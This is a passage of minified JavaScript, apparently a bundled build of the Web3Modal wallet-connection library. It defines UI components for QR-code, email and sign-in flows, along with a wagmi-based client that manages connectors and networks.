`;var k4=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Au=class extends Nt{constructor(){var e;super(),this.forceUpdate=()=>{this.requestUpdate()},window.addEventListener("resize",this.forceUpdate),we.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:((e=this.wallet)==null?void 0:e.name)??"WalletConnect",platform:"qrcode"}})}disconnectedCallback(){super.disconnectedCallback(),window.removeEventListener("resize",this.forceUpdate)}render(){return this.onRenderProxy(),$`
      <wui-flex padding="xl" flexDirection="column" gap="xl" alignItems="center">
        <wui-shimmer borderRadius="l" width="100%"> ${this.qrCodeTemplate()} </wui-shimmer>

        <wui-text variant="paragraph-500" color="fg-100">
          Scan this QR Code with your phone
        </wui-text>
        ${this.copyTemplate()}
      </wui-flex>

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onRenderProxy(){!this.ready&&this.uri&&(this.timeout=setTimeout(()=>{this.ready=!0},200))}qrCodeTemplate(){if(!this.uri||!this.ready)return null;const e=this.getBoundingClientRect().width-40,n=this.wallet?this.wallet.name:void 0;return Re.setWcLinking(void 0),Re.setRecentWallet(this.wallet),$` <wui-qr-code
      size=${e}
      theme=${It.state.themeMode}
      uri=${this.uri}
      imageSrc=${ve(Xe.getWalletImage(this.wallet))}
      alt=${ve(n)}
    ></wui-qr-code>`}copyTemplate(){const e=!this.uri||!this.ready;return $`<wui-link
      .disabled=${e}
      @click=${this.onCopyUri}
      color="fg-200"
      data-testid="copy-wc2-uri"
    >
      <wui-icon size="xs" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
      Copy link
    </wui-link>`}};Au.styles=N4;Au=k4([z("w3m-connecting-wc-qrcode")],Au);const M4=q`
  :host {
    display: flex;
    justify-content: center;
    gap: var(--wui-spacing-2xl);
  }

  wui-visual-thumbnail:nth-child(1) {
    z-index: 1;
  }
`;var U4=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Tu=class extends H{constructor(){var e;super(...arguments),this.dappImageUrl=(e=Ue.state.metadata)==null?void 0:e.icons,this.walletImageUrl=_t.getConnectedWalletImageUrl()}firstUpdated(){var n;const e=(n=this.shadowRoot)==null?void 0:n.querySelectorAll("wui-visual-thumbnail");e!=null&&e[0]&&this.createAnimation(e[0],"translate(18px)"),e!=null&&e[1]&&this.createAnimation(e[1],"translate(-18px)")}render(){var e;return $`
      <wui-visual-thumbnail
        ?borderRadiusFull=${!0}
        .imageSrc=${(e=this.dappImageUrl)==null?void 0:e[0]}
      ></wui-visual-thumbnail>
      <wui-visual-thumbnail .imageSrc=${this.walletImageUrl}></wui-visual-thumbnail>
    `}createAnimation(e,n){e.animate([{transform:"translateX(0px)"},{transform:n}],{duration:1600,easing:"cubic-bezier(0.56, 0, 0.48, 1)",direction:"alternate",iterations:1/0})}};Tu.styles=M4;Tu=U4([z("w3m-connecting-siwe")],Tu);var B4=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let C0=class extends H{constructor(){var e;if(super(),this.wallet=(e=ie.state.data)==null?void 0:e.wallet,!this.wallet)throw new Error("w3m-connecting-wc-unsupported: No wallet provided");we.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser"}})}render(){return $`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-wallet-image
          size="lg"
          imageSrc=${ve(Xe.getWalletImage(this.wallet))}
        ></wui-wallet-image>

        <wui-text variant="paragraph-500" color="fg-100">Not Detected</wui-text>
      </wui-flex>

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}};C0=B4([z("w3m-connecting-wc-unsupported")],C0);var L4=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let S0=class extends Nt{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-web: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.secondaryBtnLabel="Open",this.secondaryLabel="Open and continue in a new browser tab",this.secondaryBtnIcon="externalLink",we.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"web"}})}onConnectProxy(){var e;if((e=this.wallet)!=null&&e.webapp_link&&this.uri)try{this.error=!1;const{webapp_link:n,name:r}=this.wallet,{redirect:o,href:i}=le.formatUniversalUrl(n,this.uri);Re.setWcLinking({name:r,href:i}),Re.setRecentWallet(this.wallet),le.openHref(o,"_blank")}catch{this.error=!0}}};S0=L4([z("w3m-connecting-wc-web")],S0);const j4=q`
  wui-icon-link[data-hidden='true'] {
    opacity: 0 !important;
    pointer-events: none;
  }
`;var Jc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};function A0(){var a,s,c,l,u,p,m;const t=(s=(a=ie.state.data)==null?void 0:a.connector)==null?void 0:s.name,e=(l=(c=ie.state.data)==null?void 0:c.wallet)==null?void 0:l.name,n=(p=(u=ie.state.data)==null?void 0:u.network)==null?void 0:p.name,r=e??t,o=We.getConnectors();return{Connect:`Connect ${o.length===1&&((m=o[0])==null?void 0:m.id)==="w3m-email"?"Email":""} Wallet`,Account:void 0,ConnectingExternal:r??"Connect Wallet",ConnectingWalletConnect:r??"WalletConnect",ConnectingSiwe:"Sign In",Networks:"Choose Network",SwitchNetwork:n??"Switch Network",AllWallets:"All Wallets",WhatIsANetwork:"What is a network?",WhatIsAWallet:"What is a wallet?",GetWallet:"Get a wallet",Downloads:r?`Get ${r}`:"Downloads",EmailVerifyOtp:"Confirm Email",EmailVerifyDevice:"Register Device",ApproveTransaction:"Approve Transaction",Transactions:"Activity",UpgradeEmailWallet:"Upgrade your Wallet",UpdateEmailWallet:"Edit Email",UpdateEmailWalletWaiting:"Approve Email"}}let to=class extends H{constructor(){super(),this.unsubscribe=[],this.heading=A0()[ie.state.view],this.buffering=!1,this.showBack=!1,this.unsubscribe.push(ie.subscribeKey("view",e=>{this.onViewChange(e),this.onHistoryChange()}),Re.subscribeKey("buffering",e=>this.buffering=e))}disconnectCallback(){this.unsubscribe.forEach(e=>e())}render(){return $`
      <wui-flex .padding=${this.getPadding()} justifyContent="space-between" alignItems="center">
        ${this.dynamicButtonTemplate()} ${this.titleTemplate()}
        <wui-icon-link
          ?disabled=${this.buffering}
          icon="close"
          @click=${this.onClose.bind(this)}
          data-testid="w3m-header-close"
        ></wui-icon-link>
      </wui-flex>
      ${this.separatorTemplate()}
    `}onWalletHelp(){we.sendEvent({type:"track",event:"CLICK_WALLET_HELP"}),ie.push("WhatIsAWallet")}async onClose(){nt.state.isSiweEnabled&&nt.state.status!=="success"&&await Re.disconnect(),ze.close()}titleTemplate(){return $`<wui-text variant="paragraph-700" color="fg-100">${this.heading}</wui-text>`}dynamicButtonTemplate(){const{view:e}=ie.state,n=e==="Connect",r=e==="ApproveTransaction";return this.showBack&&!r?$`<wui-icon-link
        id="dynamic"
        icon="chevronLeft"
        ?disabled=${this.buffering}
        @click=${this.onGoBack.bind(this)}
      ></wui-icon-link>`:$`<wui-icon-link
      data-hidden=${!n}
      id="dynamic"
      icon="helpCircle"
      @click=${this.onWalletHelp.bind(this)}
    ></wui-icon-link>`}separatorTemplate(){return this.heading?$`<wui-separator></wui-separator>`:null}getPadding(){return this.heading?["l","2l","l","2l"]:["l","2l","0","2l"]}async onViewChange(e){var r;const n=(r=this.shadowRoot)==null?void 0:r.querySelector("wui-text");if(n){const o=A0()[e];await n.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.heading=o,n.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"})}}async onHistoryChange(){var r;const{history:e}=ie.state,n=(r=this.shadowRoot)==null?void 0:r.querySelector("#dynamic");e.length>1&&!this.showBack&&n?(await n.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.showBack=!0,n.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"})):e.length<=1&&this.showBack&&n&&(await n.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.showBack=!1,n.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}onGoBack(){ie.state.view==="ConnectingSiwe"?ie.push("Connect"):ie.goBack()}};to.styles=[j4];Jc([ee()],to.prototype,"heading",void 0);Jc([ee()],to.prototype,"buffering",void 0);Jc([ee()],to.prototype,"showBack",void 0);to=Jc([z("w3m-header")],to);var S1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Iu=class extends H{constructor(){super(...arguments),this.data=[]}render(){return $`
      <wui-flex flexDirection="column" alignItems="center" gap="l">
        ${this.data.map(e=>$`
            <wui-flex flexDirection="column" alignItems="center" gap="xl">
              <wui-flex flexDirection="row" justifyContent="center" gap="1xs">
                ${e.images.map(n=>$`<wui-visual name=${n}></wui-visual>`)}
              </wui-flex>
            </wui-flex>
            <wui-flex flexDirection="column" alignItems="center" gap="xxs">
              <wui-text variant="paragraph-500" color="fg-100" align="center">
                ${e.title}
              </wui-text>
              <wui-text variant="small-500" color="fg-200" align="center">${e.text}</wui-text>
            </wui-flex>
          `)}
      </wui-flex>
    `}};S1([O({type:Array})],Iu.prototype,"data",void 0);Iu=S1([z("w3m-help-widget")],Iu);const F4=q`
  wui-flex {
    background-color: var(--wui-gray-glass-005);
  }

  a {
    text-decoration: none;
    color: var(--wui-color-fg-175);
    font-weight: 500;
  }
`;var W4=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let $u=class extends H{render(){const{termsConditionsUrl:e,privacyPolicyUrl:n}=Ue.state;return!e&&!n?null:$`
      <wui-flex .padding=${["m","s","s","s"]} justifyContent="center">
        <wui-text color="fg-250" variant="small-400" align="center">
          By connecting your wallet, you agree to our <br />
          ${this.termsTemplate()} ${this.andTemplate()} ${this.privacyTemplate()}
        </wui-text>
      </wui-flex>
    `}andTemplate(){const{termsConditionsUrl:e,privacyPolicyUrl:n}=Ue.state;return e&&n?"and":""}termsTemplate(){const{termsConditionsUrl:e}=Ue.state;return e?$`<a href=${e}>Terms of Service</a>`:null}privacyTemplate(){const{privacyPolicyUrl:e}=Ue.state;return e?$`<a href=${e}>Privacy Policy</a>`:null}};$u.styles=[F4];$u=W4([z("w3m-legal-footer")],$u);const z4=q`
  :host {
    display: block;
    padding: 0 var(--wui-spacing-xl) var(--wui-spacing-xl);
  }
`;var A1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let rc=class extends H{constructor(){super(...arguments),this.wallet=void 0}render(){if(!this.wallet)return this.style.display="none",null;const{name:e,app_store:n,play_store:r,chrome_store:o,homepage:i}=this.wallet,a=le.isMobile(),s=le.isIos(),c=le.isAndroid(),l=[n,r,i,o].filter(Boolean).length>1,u=Be.getTruncateString({string:e,charsStart:12,charsEnd:0,truncate:"end"});return l&&!a?$`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${()=>ie.push("Downloads",{wallet:this.wallet})}
        ></wui-cta-button>
      `:!l&&i?$`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${this.onHomePage.bind(this)}
        ></wui-cta-button>
      `:n&&s?$`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${this.onAppStore.bind(this)}
        ></wui-cta-button>
      `:r&&c?$`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${this.onPlayStore.bind(this)}
        ></wui-cta-button>
      `:(this.style.display="none",null)}onAppStore(){var e;(e=this.wallet)!=null&&e.app_store&&le.openHref(this.wallet.app_store,"_blank")}onPlayStore(){var e;(e=this.wallet)!=null&&e.play_store&&le.openHref(this.wallet.play_store,"_blank")}onHomePage(){var e;(e=this.wallet)!=null&&e.homepage&&le.openHref(this.wallet.homepage,"_blank")}};rc.styles=[z4];A1([O({type:Object})],rc.prototype,"wallet",void 0);rc=A1([z("w3m-mobile-download-links")],rc);const H4=q`
  :host {
    display: block;
    position: absolute;
    opacity: 0;
    pointer-events: none;
    top: 11px;
    left: 50%;
    width: max-content;
  }
`;var T1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const V4={success:{backgroundColor:"success-100",iconColor:"success-100",icon:"checkmark"},error:{backgroundColor:"error-100",iconColor:"error-100",icon:"close"}};let ic=class extends H{constructor(){super(),this.unsubscribe=[],this.timeout=void 0,this.open=et.state.open,this.unsubscribe.push(et.subscribeKey("open",e=>{this.open=e,this.onOpen()}))}disconnectedCallback(){clearTimeout(this.timeout),this.unsubscribe.forEach(e=>e())}render(){const{message:e,variant:n}=et.state,r=V4[n];return $`
      <wui-snackbar
        message=${e}
        backgroundColor=${r.backgroundColor}
        iconColor=${r.iconColor}
        icon=${r.icon}
      ></wui-snackbar>
    `}onOpen(){clearTimeout(this.timeout),this.open?(this.animate([{opacity:0,transform:"translateX(-50%) scale(0.85)"},{opacity:1,transform:"translateX(-50%) scale(1)"}],{duration:150,fill:"forwards",easing:"ease"}),this.timeout=setTimeout(()=>et.hide(),2500)):this.animate([{opacity:1,transform:"translateX(-50%) scale(1)"},{opacity:0,transform:"translateX(-50%) scale(0.85)"}],{duration:150,fill:"forwards",easing:"ease"})}};ic.styles=H4;T1([ee()],ic.prototype,"open",void 0);ic=T1([z("w3m-snackbar")],ic);const Z4=q`
  :host {
    padding: var(--wui-spacing-3xs) 0;
  }

  wui-separator {
    margin: var(--wui-spacing-s) calc(var(--wui-spacing-s) * -1);
    width: calc(100% + var(--wui-spacing-s) * 2);
  }

  wui-email-input {
    width: 100%;
  }

  form {
    width: 100%;
    display: block;
    position: relative;
    margin-bottom: var(--wui-spacing-m);
  }

  wui-icon-link,
  wui-loading-spinner {
    position: absolute;
    top: 20px;
    transform: translateY(-50%);
  }

  wui-icon-link {
    right: var(--wui-spacing-xs);
  }

  wui-loading-spinner {
    right: var(--wui-spacing-m);
  }
`;var Ja=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let li=class extends H{constructor(){super(),this.unsubscribe=[],this.formRef=Uc(),this.connectors=We.state.connectors,this.email="",this.loading=!1,this.error="",this.unsubscribe.push(We.subscribeKey("connectors",e=>this.connectors=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}firstUpdated(){var e;(e=this.formRef.value)==null||e.addEventListener("keydown",n=>{n.key==="Enter"&&this.onSubmitEmail(n)})}render(){const e=this.connectors.length>1,n=this.connectors.find(o=>o.type==="EMAIL"),r=!this.loading&&this.email.length>3;return n?$`
      <form ${Bc(this.formRef)} @submit=${this.onSubmitEmail.bind(this)}>
        <wui-email-input
          @focus=${this.onFocusEvent.bind(this)}
          .disabled=${this.loading}
          @inputChange=${this.onEmailInputChange.bind(this)}
          .errorMessage=${this.error}
        >
        </wui-email-input>

        ${r?$`
              <wui-icon-link
                size="sm"
                icon="chevronRight"
                iconcolor="accent-100"
                @click=${this.onSubmitEmail.bind(this)}
              >
              </wui-icon-link>
            `:null}
        ${this.loading?$`<wui-loading-spinner size="md" color="accent-100"></wui-loading-spinner>`:null}

        <input type="submit" hidden />
      </form>

      ${e?$`<wui-separator text="or"></wui-separator>`:null}
    `:null}onEmailInputChange(e){this.email=e.detail,this.error=""}async onSubmitEmail(e){try{if(this.loading)return;this.loading=!0,e.preventDefault();const n=We.getEmailConnector();if(!n)throw new Error("w3m-email-login-widget: Email connector not found");const{action:r}=await n.provider.connectEmail({email:this.email});we.sendEvent({type:"track",event:"EMAIL_SUBMITTED"}),r==="VERIFY_OTP"?(we.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_SENT"}),ie.push("EmailVerifyOtp",{email:this.email})):r==="VERIFY_DEVICE"&&ie.push("EmailVerifyDevice",{email:this.email})}catch(n){const r=le.parseError(n);r!=null&&r.includes("Invalid email")?this.error="Invalid email. Try again.":et.showError(n)}finally{this.loading=!1}}onFocusEvent(){we.sendEvent({type:"track",event:"EMAIL_LOGIN_SELECTED"})}};li.styles=Z4;Ja([ee()],li.prototype,"connectors",void 0);Ja([ee()],li.prototype,"email",void 0);Ja([ee()],li.prototype,"loading",void 0);Ja([ee()],li.prototype,"error",void 0);li=Ja([z("w3m-email-login-widget")],li);let T0=!1;class G4{constructor(e){this.initPromise=void 0,this.setIsConnected=n=>{ke.setIsConnected(n)},this.setCaipAddress=n=>{ke.setCaipAddress(n)},this.setBalance=(n,r)=>{ke.setBalance(n,r)},this.setProfileName=n=>{ke.setProfileName(n)},this.setProfileImage=n=>{ke.setProfileImage(n)},this.resetAccount=()=>{ke.resetAccount()},this.setCaipNetwork=n=>{Qe.setCaipNetwork(n)},this.getCaipNetwork=()=>Qe.state.caipNetwork,this.setRequestedCaipNetworks=n=>{Qe.setRequestedCaipNetworks(n)},this.getApprovedCaipNetworksData=()=>Qe.getApprovedCaipNetworksData(),this.resetNetwork=()=>{Qe.resetNetwork()},this.setConnectors=n=>{We.setConnectors(n)},this.addConnector=n=>{We.addConnector(n)},this.getConnectors=()=>We.getConnectors(),this.resetWcConnection=()=>{Re.resetWcConnection()},this.fetchIdentity=n=>gp.fetchIdentity(n),this.setAddressExplorerUrl=n=>{ke.setAddressExplorerUrl(n)},this.setSIWENonce=n=>{nt.setNonce(n)},this.setSIWESession=n=>{nt.setSession(n)},this.setSIWEStatus=n=>{nt.setStatus(n)},this.setSIWEMessage=n=>{nt.setMessage(n)},this.initControllers(e),this.initOrContinue()}async open(e){await this.initOrContinue(),ze.open(e)}async close(){await this.initOrContinue(),ze.close()}setLoading(e){ze.setLoading(e)}getThemeMode(){return It.state.themeMode}getThemeVariables(){return It.state.themeVariables}setThemeMode(e){It.setThemeMode(e),Rd(It.state.themeMode);try{const n=We.getEmailConnector();n&&n.provider.syncTheme({themeMode:It.getSnapshot().themeMode})}catch{console.info("Unable to sync theme to email connector")}}setThemeVariables(e){It.setThemeVariables(e),Tp(It.state.themeVariables);try{const n=We.getEmailConnector();n&&n.provider.syncTheme({themeVariables:It.getSnapshot().themeVariables})}catch{console.info("Unable to sync theme to email connector")}}subscribeTheme(e){return It.subscribe(e)}getState(){return{...Mi.state}}subscribeState(e){return Mi.subscribe(e)}getEvent(){return{...we.state}}subscribeEvents(e){return we.subscribe(e)}subscribeSIWEState(e){return nt.subscribe(e)}initControllers(e){if(Qe.setClient(e.networkControllerClient),Qe.setDefaultCaipNetwork(e.defaultChain),Ue.setProjectId(e.projectId),Ue.setIncludeWalletIds(e.includeWalletIds),Ue.setExcludeWalletIds(e.excludeWalletIds),Ue.setFeaturedWalletIds(e.featuredWalletIds),Ue.setTokens(e.tokens),Ue.setTermsConditionsUrl(e.termsConditionsUrl),Ue.setPrivacyPolicyUrl(e.privacyPolicyUrl),Ue.setCustomWallets(e.customWallets),Ue.setEnableAnalytics(e.enableAnalytics),Ue.setSdkVersion(e._sdkVersion),Re.setClient(e.connectionControllerClient),e.siweControllerClient){const n=e.siweControllerClient;nt.setSIWEClient(n)}e.metadata&&Ue.setMetadata(e.metadata),e.themeMode&&It.setThemeMode(e.themeMode),e.themeVariables&&It.setThemeVariables(e.themeVariables)}async initOrContinue(){return!this.initPromise&&!T0&&le.isClient()&&(T0=!0,this.initPromise=new Promise(async e=>{await Promise.all([ki(()=>Promise.resolve().then(()=>R5),void 0),ki(()=>Promise.resolve().then(()=>k5),void 0)]);const n=document.createElement("w3m-modal");document.body.insertAdjacentElement("beforeend",n),e()})),this.initPromise}}const ge={WALLET_CONNECT_CONNECTOR_ID:"walletConnect",INJECTED_CONNECTOR_ID:"injected",COINBASE_CONNECTOR_ID:"coinbaseWallet",SAFE_CONNECTOR_ID:"safe",LEDGER_CONNECTOR_ID:"ledger",EIP6963_CONNECTOR_ID:"eip6963",EMAIL_CONNECTOR_ID:"w3mEmail",EIP155:"eip155",ADD_CHAIN_METHOD:"wallet_addEthereumChain",EIP6963_ANNOUNCE_EVENT:"eip6963:announceProvider",EIP6963_REQUEST_EVENT:"eip6963:requestProvider",VERSION:"3.5.6"},Un={ConnectorExplorerIds:{[ge.COINBASE_CONNECTOR_ID]:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",[ge.SAFE_CONNECTOR_ID]:"225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",[ge.LEDGER_CONNECTOR_ID]:"19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927"},EIP155NetworkImageIds:{1:"692ed6ba-e569-459a-556a-776476829e00",42161:"600a9a04-c1b9-42ca-6785-9b4b6ff85200",43114:"30c46e53-e989-45fb-4549-be3bd4eb3b00",56:"93564157-2e8e-4ce7-81df-b264dbee9b00",250:"06b26297-fe0c-4733-5d6b-ffa5498aac00",10:"ab9c186a-c52f-464b-2906-ca59d760a400",137:"41d04d42-da3b-4453-8506-668cc0727900",100:"02b53f6a-e3d4-479e-1cb4-21178987d100",9001:"f926ff41-260d-4028-635e-91913fc28e00",324:"b310f07f-4ef7-49f3-7073-2a0a39685800",314:"5a73b3dd-af74-424e-cae0-0de859ee9400",4689:"34e68754-e536-40da-c153-6ef2e7188a00",1088:"3897a66d-40b9-4833-162f-a2c90531c900",1284:"161038da-44ae-4ec7-1208-0ea569454b00",1285:"f1d73bb6-5450-4e18-38f7-fb6484264a00",7777777:"845c60df-d429-4991-e687-91ae45791600",42220:"ab781bbc-ccc6-418d-d32d-789b15da1f00",8453:"7289c336-3981-4081-c5f4-efc26ac64a00",1313161554:"3ff73439-a619-4894-9262-4470c773a100"},ConnectorImageIds:{[ge.COINBASE_CONNECTOR_ID]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[ge.SAFE_CONNECTOR_ID]:"461db637-8616-43ce-035a-d89b8a1d5800",[ge.LEDGER_CONNECTOR_ID]:"54a1aa77-d202-4f8d-0fb2-5d2bb6db0300",[ge.WALLET_CONNECT_CONNECTOR_ID]:"ef1a1fcf-7fe8-4d69-bd6d-fda1345b4400",[ge.INJECTED_CONNECTOR_ID]:"07ba87ed-43aa-4adf-4540-9e6a2b9cae00"},ConnectorNamesMap:{[ge.INJECTED_CONNECTOR_ID]:"Browser Wallet",[ge.WALLET_CONNECT_CONNECTOR_ID]:"WalletConnect",[ge.COINBASE_CONNECTOR_ID]:"Coinbase",[ge.LEDGER_CONNECTOR_ID]:"Ledger",[ge.SAFE_CONNECTOR_ID]:"Safe"},ConnectorTypesMap:{[ge.INJECTED_CONNECTOR_ID]:"INJECTED",[ge.WALLET_CONNECT_CONNECTOR_ID]:"WALLET_CONNECT",[ge.EIP6963_CONNECTOR_ID]:"ANNOUNCED",[ge.EMAIL_CONNECTOR_ID]:"EMAIL"},WalletConnectRpcChainIds:[1,5,11155111,10,420,42161,421613,137,80001,42220,1313161554,1313161555,56,97,43114,43113,100,8453,84531,7777777,999,324,280]},yi={caipNetworkIdToNumber(t){return t?Number(t.split(":")[1]):void 0},getCaipTokens(t){if(!t)return;const e={};return Object.entries(t).forEach(([n,r])=>{e[`${ge.EIP155}:${n}`]=r}),e}};function q4(t){if(t)return{id:`${ge.EIP155}:${t.id}`,name:t.name,imageId:Un.EIP155NetworkImageIds[t.id]}}const K4="wagmi.wallet";class Y4 extends G4{constructor(e){const{wagmiConfig:n,siweConfig:r,chains:o,defaultChain:i,tokens:a,_sdkVersion:s,...c}=e;if(!n)throw new Error("web3modal:constructor - wagmiConfig is undefined");if(!c.projectId)throw new Error("web3modal:constructor - projectId is undefined");const l={switchCaipNetwork:async p=>{const m=yi.caipNetworkIdToNumber(p==null?void 0:p.id);m&&await Id({chainId:m})},async getApprovedCaipNetworksData(){var m,g,w,v;const p=localStorage.getItem(K4);if(p!=null&&p.includes(ge.EMAIL_CONNECTOR_ID))return{supportsAllNetworks:!1,approvedCaipNetworkIds:Un.WalletConnectRpcChainIds.map(E=>`${ge.EIP155}:${E}`)};if(p!=null&&p.includes(ge.WALLET_CONNECT_CONNECTOR_ID)){const E=n.connectors.find(C=>C.id===ge.WALLET_CONNECT_CONNECTOR_ID);if(!E)throw new Error("networkControllerClient:getApprovedCaipNetworks - connector is undefined");const b=(g=(m=(await E.getProvider()).signer)==null?void 0:m.session)==null?void 0:g.namespaces,_=(w=b==null?void 0:b[ge.EIP155])==null?void 0:w.methods,x=(v=b==null?void 0:b[ge.EIP155])==null?void 0:v.chains;return{supportsAllNetworks:_==null?void 0:_.includes(ge.ADD_CHAIN_METHOD),approvedCaipNetworkIds:x}}return{approvedCaipNetworkIds:void 0,supportsAllNetworks:!0}}},u={connectWalletConnect:async p=>{var w;const m=n.connectors.find(v=>v.id===ge.WALLET_CONNECT_CONNECTOR_ID);if(!m)throw new Error("connectionControllerClient:getWalletConnectUri - connector is undefined");m.on("message",v=>{v.type==="display_uri"&&(p(v.data),m.removeAllListeners())});const g=yi.caipNetworkIdToNumber((w=this.getCaipNetwork())==null?void 0:w.id);await Wf({connector:m,chainId:g})},connectExternal:async({id:p,provider:m,info:g})=>{var E,I;const w=n.connectors.find(b=>b.id===p);if(!w)throw new Error("connectionControllerClient:connectExternal - connector is undefined");m&&g&&w.id===ge.EIP6963_CONNECTOR_ID&&((E=w.setEip6963Wallet)==null||E.call(w,{provider:m,info:g}));const v=yi.caipNetworkIdToNumber((I=this.getCaipNetwork())==null?void 0:I.id);await Wf({connector:w,chainId:v})},checkInstalled:p=>{const m=this.getConnectors().filter(w=>w.type==="ANNOUNCED"),g=this.getConnectors().find(w=>w.type==="INJECTED");return p?m.length&&p.some(v=>m.some(E=>{var I;return((I=E.info)==null?void 0:I.rdns)===v}))?!0:g&&window!=null&&window.ethereum?p.some(w=>{var v;return!!((v=window.ethereum)!=null&&v[String(w)])}):!1:!!window.ethereum},disconnect:async()=>{var p;await hp(),(p=r==null?void 0:r.options)!=null&&p.signOutOnDisconnect&&await r.signOut()},signMessage:async p=>T2({message:p})};super({networkControllerClient:l,connectionControllerClient:u,siweControllerClient:r,defaultChain:q4(i),tokens:yi.getCaipTokens(a),_sdkVersion:s??`html-wagmi-${ge.VERSION}`,...c}),this.hasSyncedConnectedAccount=!1,this.options=void 0,this.options=e,this.syncRequestedNetworks(o),this.syncConnectors(n),this.syncEmailConnector(n),this.listenEIP6963Connector(n),this.listenEmailConnector(n),pp(()=>this.syncAccount()),I2(()=>this.syncNetwork())}getState(){const e=super.getState();return{...e,selectedNetworkId:yi.caipNetworkIdToNumber(e.selectedNetworkId)}}subscribeState(e){return 